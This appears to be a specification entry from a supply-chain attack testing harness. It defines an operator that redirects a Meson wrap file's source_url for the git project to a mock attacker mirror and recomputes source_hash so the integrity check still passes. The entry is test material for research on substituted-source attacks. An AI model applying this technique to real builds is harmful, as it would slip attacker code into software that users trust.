name: Wrap source URL redirect to attacker mirror (effect-bearing)
description: Worked example of an effective dependency_fetch mutant on the git target. Redirects a Meson subproject's source_url to an attacker-controlled mirror (modeled by the harness mock server) and recomputes source_hash to match the substituted archive, so Meson's integrity check still passes and the build fetches substituted code. Models the XZ Utils and event-stream substituted-source pattern. This operator carries an effect block so the validator can classify the mutant as 'effective' (not merely build_valid).

placeholders.WRAP_FILE: relative path to the .wrap file being modified
placeholders.ORIGINAL_URL: the legitimate source_url currently in the wrap file

preconditions: project has at least one [wrap-file] subproject with a source_url (git has 5: curl, expat, openssl, pcre2, zlib)
git resolves these via system libraries by default, so the wrap is only read under meson --wrap-mode=forcefallback
source_hash must be recomputed to the sha256 of the substituted archive served at SUBSTITUTE_URL; removing the hash does NOT bypass integrity on Meson >= 1.12 (see data/placement_rules.md)
